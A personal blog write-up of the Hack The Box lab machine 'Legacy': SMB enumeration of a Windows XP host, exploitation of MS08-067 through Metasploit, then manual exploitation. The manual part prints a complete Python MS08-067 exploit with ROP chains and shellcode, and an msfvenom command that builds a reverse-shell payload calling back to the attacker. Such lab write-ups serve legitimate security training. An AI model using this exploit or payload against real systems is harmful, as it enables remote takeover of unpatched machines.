---
layout: post
title: Hack The Box - Legacy
---

This post is an overview of my time working through the box "Legacy" found in [HackTheBox](https://www.hackthebox.eu)

---
![](/assets/image/attachmentsPasted&#32;image&#32;20210707143217.png)

As part of the PEH course offered by Heath Adams (thecybermentor) I am completing a series of Hack the Box machines, the first of these is Legacy.

### Nmap enumeration

```sql
# Nmap 7.91 scan initiated Sat Jun  5 09:49:51 2021 as: nmap -sC -sV -oN 10.10.10.4 -Pn 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.047s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h35m28s, deviation: 2h07m16s, median: 4d23h05m28s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:4d:3a (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-06-10T18:55:32+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun  5 09:50:53 2021 -- 1 IP address (1 host up) scanned in 62.63 seconds

```

Based on this we gain some interesting insights, the host is running SMB, and it is a old OS windows XP

using the `smb_version` module on metasploit we gain some more information

```
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.10.10.4:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[+] 10.10.10.4:445        -   Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB)
[*] 10.10.10.4:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

null authentication seems to be disabled

```
└─$ smbclient -L 10.10.10.4 -U ""
Enter WORKGROUP\'s password: 
session setup failed: NT_STATUS_LOGON_FAILURE

```

running enum4linux we don't really gain anything

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun  5 10:05:42 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.4
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB

 ========================================== 
|    Nbtstat Information for 10.10.10.4    |
 ========================================== 
Looking up status of 10.10.10.4
	LEGACY          <00> -         B <ACTIVE>  Workstation Service
	HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	LEGACY          <20> -         B <ACTIVE>  File Server Service
	HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
	HTB             <1d> -         B <ACTIVE>  Master Browser
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

	MAC Address = 00-50-56-B9-4D-3A

 =================================== 
|    Session Check on 10.10.10.4    |
 =================================== 
[+] Server 10.10.10.4 allows sessions using username '', password ''

 ========================================= 
|    Getting domain SID for 10.10.10.4    |
 ========================================= 
Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED
[+] Can't determine if host is part of domain or part of a workgroup

 ==================================== 
|    OS information on 10.10.10.4    |
 ==================================== 
[+] Got OS info for 10.10.10.4 from smbclient: 
[+] Got OS info for 10.10.10.4 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =========================== 
|    Users on 10.10.10.4    |
 =========================== 
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ======================================= 
|    Share Enumeration on 10.10.10.4    |
 ======================================= 
[E] Can't list shares: NT_STATUS_ACCESS_DENIED

[+] Attempting to map shares on 10.10.10.4

 ================================================== 
|    Password Policy Information for 10.10.10.4    |
 ================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.4 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.10.10.4)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)


[E] Failed to get password policy with rpcclient


 ============================ 
|    Groups on 10.10.10.4    |
 ============================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ===================================================================== 
|    Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =========================================== 
|    Getting printer info for 10.10.10.4    |
 =========================================== 
No printers returned.


enum4linux complete on Sat Jun  5 10:05:48 2021


```

eventually with some searchsploit and google fu I discovered a promising looking exploit, **MS08-067**

### Metasploit exploitation
using the metasploit module `windows/smb/ms08_067_netapi` I was able to get a meterpreter shell back

```
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.4:1031) at 2021-06-05 10:24:57 -0400
```

from here it is really trivial to get the flags, running `getsystem` in metasploit we escalate our privileges and can navigate to user desktop's to read both flags

```
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
<flag_here>
```

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
<flag_here>
```

### Manual exploitation
It's always fun to try and push yourself to do something manually after using metasploit.
I found a python script with searchsploit that looks promising

```py
import struct

import time

import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:
    from impacket import smb
    from impacket import uuid
    from impacket import dcerpc
    from impacket.dcerpc.v5 import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'



print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'



print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;

#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)

#EXITFUNC=thread Important!

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python

shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

shellcode += "\x2b\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e\x81"

shellcode += "\x76\x0e\xb7\xdd\x9e\xe0\x83\xee\xfc\xe2\xf4\x4b\x35"

shellcode += "\x1c\xe0\xb7\xdd\xfe\x69\x52\xec\x5e\x84\x3c\x8d\xae"

shellcode += "\x6b\xe5\xd1\x15\xb2\xa3\x56\xec\xc8\xb8\x6a\xd4\xc6"

shellcode += "\x86\x22\x32\xdc\xd6\xa1\x9c\xcc\x97\x1c\x51\xed\xb6"

shellcode += "\x1a\x7c\x12\xe5\x8a\x15\xb2\xa7\x56\xd4\xdc\x3c\x91"

shellcode += "\x8f\x98\x54\x95\x9f\x31\xe6\x56\xc7\xc0\xb6\x0e\x15"

shellcode += "\xa9\xaf\x3e\xa4\xa9\x3c\xe9\x15\xe1\x61\xec\x61\x4c"

shellcode += "\x76\x12\x93\xe1\x70\xe5\x7e\x95\x41\xde\xe3\x18\x8c"

shellcode += "\xa0\xba\x95\x53\x85\x15\xb8\x93\xdc\x4d\x86\x3c\xd1"

shellcode += "\xd5\x6b\xef\xc1\x9f\x33\x3c\xd9\x15\xe1\x67\x54\xda"

shellcode += "\xc4\x93\x86\xc5\x81\xee\x87\xcf\x1f\x57\x82\xc1\xba"

shellcode += "\x3c\xcf\x75\x6d\xea\xb5\xad\xd2\xb7\xdd\xf6\x97\xc4"

shellcode += "\xef\xc1\xb4\xdf\x91\xe9\xc6\xb0\x22\x4b\x58\x27\xdc"

shellcode += "\x9e\xe0\x9e\x19\xca\xb0\xdf\xf4\x1e\x8b\xb7\x22\x4b"

shellcode += "\x8a\xb2\xb5\x5e\x48\xa9\x90\xf6\xe2\xb7\xdc\x25\x69"

shellcode += "\x51\x8d\xce\xb0\xe7\x9d\xce\xa0\xe7\xb5\x74\xef\x68"

shellcode += "\x3d\x61\x35\x20\xb7\x8e\xb6\xe0\xb5\x07\x45\xc3\xbc"

shellcode += "\x61\x35\x32\x1d\xea\xea\x48\x93\x96\x95\x5b\x35\xff"

shellcode += "\xe0\xb7\xdd\xf4\xe0\xdd\xd9\xc8\xb7\xdf\xdf\x47\x28"

shellcode += "\xe8\x22\x4b\x63\x4f\xdd\xe0\xd6\x3c\xeb\xf4\xa0\xdf"

shellcode += "\xdd\x8e\xe0\xb7\x8b\xf4\xe0\xdf\x85\x3a\xb3\x52\x22"

shellcode += "\x4b\x73\xe4\xb7\x9e\xb6\xe4\x8a\xf6\xe2\x6e\x15\xc1"

shellcode += "\x1f\x62\x5e\x66\xe0\xca\xff\xc6\x88\xb7\x9d\x9e\xe0"

shellcode += "\xdd\xdd\xce\x88\xbc\xf2\x91\xd0\x48\x08\xc9\x88\xc2"

shellcode += "\xb3\xd3\x81\x48\x08\xc0\xbe\x48\xd1\xba\x09\xc6\x22"

shellcode += "\x61\x1f\xb6\x1e\xb7\x26\xc2\x1a\x5d\x5b\x57\xc0\xb4"

shellcode += "\xea\xdf\x7b\x0b\x5d\x2a\x22\x4b\xdc\xb1\xa1\x94\x60"

shellcode += "\x4c\x3d\xeb\xe5\x0c\x9a\x8d\x92\xd8\xb7\x9e\xb3\x48"

shellcode += "\x08\x9e\xe0"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10

disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"

ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";

module_base = 0x6f880000

def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"

	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	

	gadget3="\xcc\x90\xeb\x5a"	

	ret=struct.pack('<L', 0x00018000)

	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)

	ret+=struct.pack('<L', 0x01040110)

	ret+=struct.pack('<L', 0x01010101)

	ret+=struct.pack('<L', 0x01010101)

	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)

	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)

	ret+=gadget1

	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)

	ret+=struct.pack('<L', rvas['jmp eax']+module_base)

	ret+=gadget2[0]

	ret+=gadget2[1]

	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)

	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)

	ret+=gadget2[2]

	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)

	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)

	ret+=struct.pack('<L', rvas['jmp eax']+module_base)

	ret+=gadget3	

	return ret

class SRVSVC_Exploit(Thread):

   def __init__(self, target, os, port=445):

     super(SRVSVC_Exploit, self).__init__()


        self.__port   = port

        self.target   = target

	self.os	      = os


    def __DCEPacket(self):

	if (self.os=='1'):

		print 'Windows XP SP0/SP1 Universal\n'

		ret = "\x61\x13\x00\x01"

		jumper = nonxjmper % (ret, ret)

	elif (self.os=='2'):

		print 'Windows 2000 Universal\n'

		ret = "\xb0\x1c\x1f\x00"

		jumper = nonxjmper % (ret, ret)

	elif (self.os=='3'):

		print 'Windows 2003 SP0 Universal\n'

		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e

		jumper = nonxjmper % (ret, ret)

	elif (self.os=='4'):

		print 'Windows 2003 SP1 English\n'

		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL

		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL

		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL

		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL

		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)

	elif (self.os=='5'):

		print 'Windows XP SP3 French (NX)\n'

		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 

		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 

		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.

	elif (self.os=='6'):

		print 'Windows XP SP3 English (NX)\n'

		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 

		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 

		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.

	elif (self.os=='7'):

		print 'Windows XP SP3 English (AlwaysOn NX)\n'

		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}

		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.

	else:

		print 'Not supported OS version\n'

		sys.exit(-1)

	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2   server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'


if __name__ == '__main__':

       try:

           target = sys.argv[1]

	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'

				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)

current = SRVSVC_Exploit(target, os)
current.start()

```


first I re-generated my own shellcode so I will actually be able to get a callback,
take note of the information given above the shellcode in the script as it instructs you how to generate owrking shellcode

```py
#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;

#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)

#EXITFUNC=thread Important!

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
```

The comment says use a payload of 380 bytes, so I decided for 410 with 30 bytes for unpacking, I cannot generate a payload of 380, the closed msfvenom could do was 378, so I added two more NOPs to keep at 410

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=53 EXITFUNC=thread -f python -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -s 410 -n 30 -v shellcode
.
.
.
shellcode="\x90" * 32

shellcode+= "\x37\x37\x9f\x27\x99\x4a\x91\x4b\x43\x48\x49\xd6\x98"   
shellcode+= "\x93\x9f\xf9\xd6\x3f\xf8\x3f\x43\xf9\x4a\x93\x4b\x48"    
shellcode+= "\x48\x37\x41\x92\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff" 
shellcode+= "\xff\xc0\x5e\x81\x76\x0e\x93\x91\x98\xeb\x83\xee\xfc"  
shellcode+= "\xe2\xf4\x6f\x79\x1a\xeb\x93\x91\xf8\x62\x76\xa0\x58"  
shellcode+= "\x8f\x18\xc1\xa8\x60\xc1\x9d\x13\xb9\x87\x1a\xea\xc3" 
shellcode+= "\x9c\x26\xd2\xcd\xa2\x6e\x34\xd7\xf2\xed\x9a\xc7\xb3"  
shellcode+= "\x50\x57\xe6\x92\x56\x7a\x19\xc1\xc6\x13\xb9\x83\x1a"  
shellcode+= "\xd2\xd7\x18\xdd\x89\x93\x70\xd9\x99\x3a\xc2\x1a\xc1" 
shellcode+= "\xcb\x92\x42\x13\xa2\x8b\x72\xa2\xa2\x18\xa5\x13\xea"  
shellcode+= "\x45\xa0\x67\x47\x52\x5e\x95\xea\x54\xa9\x78\x9e\x65" 
shellcode+= "\x92\xe5\x13\xa8\xec\xbc\x9e\x77\xc9\x13\xb3\xb7\x90" 
shellcode+= "\x4b\x8d\x18\x9d\xd3\x60\xcb\x8d\x99\x38\x18\x95\x13"
shellcode+= "\xea\x43\x18\xdc\xcf\xb7\xca\xc3\x8a\xca\xcb\xc9\x14"  
shellcode+= "\x73\xce\xc7\xb1\x18\x83\x73\x66\xce\xf9\xab\xd9\x93"   
shellcode+= "\x91\xf0\x9c\xe0\xa3\xc7\xbf\xfb\xdd\xef\xcd\x94\x6e" 
shellcode+= "\x4d\x53\x03\x90\x98\xeb\xba\x55\xcc\xbb\xfb\xb8\x18" 
shellcode+= "\x80\x93\x6e\x4d\xbb\xc3\xc1\xc8\xab\xc3\xd1\xc8\x83" 
shellcode+= "\x79\x9e\x47\x0b\x6c\x44\x0f\x81\x96\xf9\x92\xe1\x9d"  
shellcode+= "\x96\xf0\xe9\x93\x91\xad\x62\x75\xfb\x88\xbd\xc4\xf9"
shellcode+= "\x01\x4e\xe7\xf0\x67\x3e\x16\x51\xec\xe7\x6c\xdf\x90" 
shellcode+= "\x9e\x7f\xf9\x68\x5e\x31\xc7\x67\x3e\xfb\xf2\xf5\x8f" 
shellcode+= "\x93\x18\x7b\xbc\xc4\xc6\xa9\x1d\xf9\x83\xc1\xbd\x71" 
shellcode+= "\x6c\xfe\x2c\xd7\xb5\xa4\xea\x92\x1c\xdc\xcf\x83\x57" 
shellcode+= "\x98\xaf\xc7\xc1\xce\xbd\xc5\xd7\xce\xa5\xc5\xc7\xcb"                 
shellcode+= "\xbd\xfb\xe8\x54\xd4\x15\x6e\x4d\x62\x73\xdf\xce\xad"                 
shellcode+= "\x6c\xa1\xf0\xe3\x14\x8c\xf8\x14\x46\x2a\x78\xf6\xb9"                 
shellcode+= "\x9b\xf0\x4d\x06\x2c\x05\x14\x46\xad\x9e\x97\x99\x11"                 
shellcode+= "\x63\x0b\xe6\x94\x23\xac\x80\xe3\xf7\x81\x93\xc2\x67"                 
shellcode+= "\x3e"

```

running the script

![](/assets/image/attachmentsPasted&#32;image&#32;20210605162843.png)

we get back a reverse shell

from here it is the same process as before to read the flags

### closing remarks

This box was quite fun especially trying to get the manual part functioning

Thank you for reading.
